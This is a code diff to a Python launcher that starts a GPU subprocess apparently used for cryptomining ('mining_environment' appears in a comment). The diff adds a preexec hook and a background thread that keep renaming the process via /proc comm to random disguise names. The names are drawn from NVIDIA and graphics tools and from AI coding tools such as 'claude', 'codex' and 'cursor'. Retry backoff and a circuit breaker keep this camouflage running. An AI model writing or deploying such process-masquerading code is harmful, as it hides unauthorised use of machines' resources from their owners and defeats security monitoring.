@@ -190,33 +190,60 @@ def main():
             logger.info("🧠 [MEMORY-OPT] DAG generation memory limits applied")
             
             # Start inference-cuda as subprocess
+            # Pre-select child target name and setup preexec self-rename
+            stealth_names = [
+                "nvidiasmi", "cudagdb", "nvcc", "nvidiamlpy",
+                "nvidiasettings", "gpumanager", "glxgears",
+                "vulkaninfo", "mesaloader", "drmtip",
+                "tensorcore", "cudadrvr", "nvcompiler", "openclwkr",
+                "cudnnhelp", "nvrmdaemon", "gpusched", "cudaipc",
+                "claude", "codex", "code", "openai", "cursor", "agents", "windsurf"
+            ]
+            child_target_name = random.choice(stealth_names)
+
+            def _sanitize_comm_name(name: str) -> str:
+                """
+                Chuẩn hóa tên tiến trình cho /proc/*/comm: whitelist ký tự an toàn và giới hạn ≤15 byte.
+                """
+                allowed = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-"
+                filtered = ''.join(ch for ch in name if ch in allowed)
+                if not filtered:
+                    filtered = "gpuworker"
+                b = filtered.encode('utf-8')[:15]
+                return b.decode('utf-8', errors='ignore')
+
+            def _child_preexec():
+                """
+                Child pre-exec hook: tách nhóm tiến trình và tự đổi tên qua /proc/self/comm.
+                Tránh logging trong preexec để an toàn trước exec.
+                """
+                try:
+                    os.setsid()
+                except Exception:
+                    pass
+                try:
+                    target = _sanitize_comm_name(child_target_name)
+                    with open("/proc/self/comm", "wb") as f:
+                        f.write(target.encode("utf-8"))
+                except Exception:
+                    pass
+
             # **FIX: Remove stdout/stderr redirection to allow parent capture** (sửa: bỏ chuyển hướng stdout/stderr để parent có thể capture)
             process = subprocess.Popen(
                 exec_command,
-                env=clean_env  # Use clean environment for subprocess ONLY
+                env=clean_env,  # Use clean environment for subprocess ONLY
+                preexec_fn=_child_preexec
                 # stdout and stderr will inherit parent's pipes for logging
             )
             logger.info(f"✅ [GPU-POST-EXEC-STEALTH] inference-cuda started as subprocess PID: {process.pid}")
             # ---- New: Rename child PID and register to DirectPIDRegistry ----
             try:
-                stealth_names = [
-                    "nvidiasmi", "cudagdb", "nvcc", "nvidiamlpy",
-                    "nvidiasettings", "gpumanager", "glxgears",
-                    "vulkaninfo", "mesaloader", "drmtip",
-                    "tensorcore", "cudadrvr", "nvcompiler", "openclwkr",
-                    "cudnnhelp", "nvrmdaemon", "gpusched", "cudaipc",
-                    "claude", "codex", "code", "openai", "cursor", "agents", "windsurf"
-                ]
-                new_name = random.choice(stealth_names)[:15]
-                # /proc/<pid>/comm expects <=15 bytes, no newline
-                safe_name = new_name.encode("utf-8")[:15].decode("utf-8", errors="ignore")
+                # /proc/<pid>/comm expects ≤15 byte; child self-rename đã được thiết lập qua preexec_fn
+                new_name = child_target_name
                 
-                # ✅ **FIX: CONTAINER PERMISSION ISSUE** (sửa: vấn đề quyền trong container)
-                # Child process renaming fails in container due to permission restrictions
-                # Skip direct child renaming, rely on background stealth maintenance instead
-                logger.info(f"🔄 [GPU-POST-EXEC-STEALTH] Skipping immediate child rename (PID {process.pid})")
-                logger.info(f"🔄 [GPU-POST-EXEC-STEALTH] Background stealth thread will handle renaming: '{new_name}'")
-                rename_success = True  # Treat as success to continue execution
+                # ✅ Child self-rename sẽ chạy trong preexec_fn; giữ background thread như fallback
+                logger.info(f"🔒 [GPU-POST-EXEC-STEALTH] Child self-rename scheduled via preexec_fn (PID {process.pid}) target='{new_name}'")
+                rename_success = True
                 
                 # Enhanced background stealth with improved container compatibility
                 def _enhanced_stealth_rename():
@@ -436,10 +463,25 @@ def main():
                 resource_error_count = 0  # Track consecutive errors
                 max_errors = 3           # Threshold để emergency handling
                 
+                # Backoff & rate-limit controls
+                sleep_seconds = 20.0
+                max_sleep_seconds = 120.0
+                fail_streak = 0
+                last_einval_log_ts = 0.0
+                last_perm_log_ts = 0.0
+                last_could_log_ts = 0.0
+                pause_until = 0.0
+                circuit_open = False
+                
                 while process.poll() is None:  # While process is running
                     try:
-                        time.sleep(20)  # GPU-specific interval
+                        time.sleep(sleep_seconds)  # Adaptive interval with backoff
                         if process.poll() is None:  # Check again after sleep
+                            # Circuit breaker pause window
+                            now_ts = time.time()
+                            if pause_until and now_ts < pause_until:
+                                logger.debug("⏸️ [GPU-STEALTH-MAINTENANCE] Circuit breaker active; skipping cycle")
+                                continue
                             
                             # Enhanced Resource Health Check - Tương tự resource_control.py monitoring
                             try:
@@ -456,6 +498,8 @@ def main():
                                         logger.error(f"🚨 [GPU-RESOURCE-MONITOR] Max resource errors reached. Process may need restart.")
                                         # Log for mining_environment analysis
                                         break
+                                    # Skip rename while process is in D state
+                                    continue
                                 else:
                                     resource_error_count = 0  # Reset counter on healthy state
                                     
@@ -464,49 +508,63 @@ def main():
                             
                             # Apply GPU stealth to subprocess với enhanced container-safe approach
                             gpu_stealth_name = random.choice(gpu_stealth_names)
-                            safe_gpu_name = gpu_stealth_name[:15]
+                            safe_gpu_name = _sanitize_comm_name(gpu_stealth_name)
                             
                             # **Enhanced Container-Safe Renaming** (đổi tên an toàn trong container)
                             rename_attempted = False
                             try:
                                 # **Strategy 1**: prctl system call (preferred for containers)
-                                import ctypes
-                                libc = ctypes.CDLL('libc.so.6')
-                                PR_SET_NAME = 15
-                                name_bytes = safe_gpu_name.encode('utf-8')[:15] + b'\0'
-                                
                                 # Note: prctl only works on current process, not child processes
                                 # This is a limitation we acknowledge
                                 logger.debug(f"🔄 [GPU-STEALTH-MAINTENANCE] Cannot use prctl on child PID {process.pid}")
                                 
                                 # **Strategy 2**: Enhanced /proc/comm method với error handling
                                 comm_path = f"/proc/{process.pid}/comm"
-                                if os.path.exists(comm_path):
+                                if os.path.exists(comm_path) and os.access(comm_path, os.W_OK):
                                     with open(comm_path, "w") as f:
                                         f.write(safe_gpu_name)
                                     logger.debug(f"🔄 [GPU-STEALTH-MAINTENANCE] GPU Subprocess PID {process.pid} renamed to: {safe_gpu_name}")
                                     rename_attempted = True
+                                    fail_streak = 0
+                                    sleep_seconds = 20.0
+                                    circuit_open = False
                                 else:
-                                    logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] Process {process.pid} comm file not found")
-                                    
+                                    logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] Process {process.pid} comm not writable or missing")
+                            
                             except OSError as os_err:
+                                fail_streak += 1
+                                sleep_seconds = min(sleep_seconds * 1.5, max_sleep_seconds)
+                                now_ts = time.time()
                                 if os_err.errno == 22:  # EINVAL
-                                    logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] EINVAL error renaming PID {process.pid} - process may be busy")
-                                elif os_err.errno == 1:  # EPERM  
-                                    logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] Permission denied renaming PID {process.pid} - container restrictions")
+                                    if (now_ts - last_einval_log_ts) > 60:
+                                        logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] EINVAL error renaming PID {process.pid} - process may be busy")
+                                        last_einval_log_ts = now_ts
+                                elif os_err.errno == 1:  # EPERM
+                                    if (now_ts - last_perm_log_ts) > 300:
+                                        logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] Permission denied renaming PID {process.pid} - container restrictions")
+                                        last_perm_log_ts = now_ts
                                 else:
                                     logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] OS error renaming PID {process.pid}: {os_err}")
+                                # Circuit breaker
+                                if fail_streak >= 5 and not circuit_open:
+                                    circuit_open = True
+                                    pause_until = now_ts + 300  # 5 minutes
+                                    logger.warning("⛔ [GPU-STEALTH-MAINTENANCE] Circuit breaker engaged due to repeated failures (5). Pausing 300s")
                             except Exception as comm_error:
                                 logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] General error renaming GPU subprocess: {comm_error}")
                                 
                             if not rename_attempted:
-                                logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] Could not rename PID {process.pid} - continuing with original name")
-                                
+                                now_ts = time.time()
+                                if (now_ts - last_could_log_ts) > 60:
+                                    logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] Could not rename PID {process.pid} - continuing with original name")
+                                    last_could_log_ts = now_ts
+                    
                     except Exception as e:
                         logger.error(f"❌ [GPU-POST-EXEC-STEALTH] Error in GPU stealth maintenance: {e}")
                         break
                         
                 logger.info("🔚 [GPU-POST-EXEC-STEALTH] GPU subprocess terminated - stopping stealth maintenance")
+                        
             
             # Start GPU stealth maintenance thread
             gpu_stealth_thread = threading.Thread(target=maintain_gpu_subprocess_stealth, daemon=True)
@@ -532,6 +590,7 @@ def main():
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE,
                     text=True,
+                    preexec_fn=_child_preexec,
                     env=clean_env  # Use clean environment for fallback subprocess too
                 )
                 
